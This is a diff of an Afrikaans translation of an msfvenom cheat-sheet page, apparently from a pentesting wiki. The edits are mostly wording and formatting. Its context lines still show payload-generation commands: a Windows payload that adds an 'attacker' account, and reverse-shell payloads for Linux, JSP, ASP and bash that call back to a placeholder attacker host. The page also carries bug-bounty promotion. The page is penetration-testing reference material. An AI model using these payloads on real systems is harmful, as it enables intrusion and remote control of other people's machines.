@@ -15,7 +15,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en bug bounty jagters!
 
@@ -38,7 +38,7 @@ Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike pla
 
 Mens kan ook die `-a` gebruik om die argitektuur te spesifiseer of die `--platform`
 
-## Lyste
+## Lys
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
@@ -75,7 +75,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
 {% endcode %}
 
-### CMD Shell
+### CMD-skaal
 
 {% code overflow="wrap" %}
 ```bash
@@ -105,8 +105,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 ## Linux Payloads
 
 ### Reverse Shell
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
@@ -160,7 +158,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 
 ### ASP/x
 
-#### Terug shell
+#### Terugshell
 
 {% code overflow="wrap" %}
 ```bash
@@ -177,8 +175,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
-{% endcode %}
-
 ### OORLOG
 
 #### Terug Shell
@@ -211,15 +207,15 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Sluit aan by [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om met ervare hackers en bug bounty jagters te kommunikeer!
 
 **Hacking Inligting**\
-Betrek met inhoud wat die opwinding en uitdagings van hacking ondersoek
+Betrek jouself met inhoud wat die opwinding en uitdagings van hacking ondersoek
 
 **Regte Tyd Hack Nuus**\
-Bly op hoogte van die vinnige hacking wêreld deur regte tyd nuus en insigte
+Bly op hoogte van die vinnig bewegende hacking wêreld deur middel van regte tyd nuus en insigte
 
 **Laaste Aankondigings**\
 Bly ingelig oor die nuutste bug bounties wat bekendgestel word en belangrike platform opdaterings
